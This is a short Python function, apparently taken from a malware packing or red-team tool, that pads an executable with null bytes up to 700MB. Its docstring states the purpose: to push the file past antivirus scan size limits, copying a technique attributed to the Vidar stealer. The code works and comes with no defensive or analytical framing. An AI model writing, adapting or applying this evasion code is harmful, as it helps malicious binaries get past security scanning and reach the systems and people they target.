def bloat_binary(path, target_mb=700):
    """Pad binary with null bytes to exceed AV scan size limits (~100-200MB).
    Most AV engines skip files >200MB for performance. 700MB matches Vidar technique."""
    current = os.path.getsize(path)
    target = target_mb * 1024 * 1024
    if current >= target:
        print(f"  [~] Already {current:,} bytes, no bloat needed")
        return
    print(f"  [*] Bloating {current:,} â†’ {target:,} bytes ({target_mb}MB)...")
    remaining = target - current
    chunk = b'\x00' * (1024 * 1024)  # 1MB at a time
    with open(path, 'ab') as f:
        while remaining > 0:
            write_size = min(len(chunk), remaining)
            f.write(chunk[:write_size])
            remaining -= write_size
    final = os.path.getsize(path)
    print(f"  [+] Bloated: {current:,} â†’ {final:,} bytes")

